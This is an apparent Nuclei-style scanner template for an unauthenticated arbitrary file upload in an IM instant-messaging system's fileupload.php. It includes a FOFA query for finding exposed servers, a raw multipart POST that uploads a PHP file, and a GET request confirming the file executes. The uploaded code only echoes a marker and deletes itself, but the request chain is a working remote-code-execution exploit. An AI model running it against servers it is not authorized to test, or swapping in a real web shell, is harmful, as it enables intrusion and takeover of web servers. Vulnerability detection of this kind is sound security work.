id: im-system-fileupload-file-upload

info:
  name: "IM即时通讯系统 fileupload.php 接口未授权任意文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/superloginAction.html" || "im.smiaoshen.com"
          IM即时通讯系统 fileupload.php 接口存在未授权任意文件上传漏洞，攻击者可利用此漏洞在目标服务器上上传恶意文件，导致远程代码执行，从而获取系统权限并控制整个Web服务器。
  tags: IM即时通讯系统

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /static/lib/webuploader/0.1.5/server/fileupload.php HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaKljzbg49Mq4ggLz

    ------WebKitFormBoundaryaKljzbg49Mq4ggLz
    Content-Disposition: form-data; name="file"; filename="NTest.php"
    Content-Type: text/plain

    <?php echo 'NdayTest'; unlink(__FILE__); ?>
    ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
- raw:
  - |
    GET /static/lib/webuploader/0.1.5/server/upload/NTest.php HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
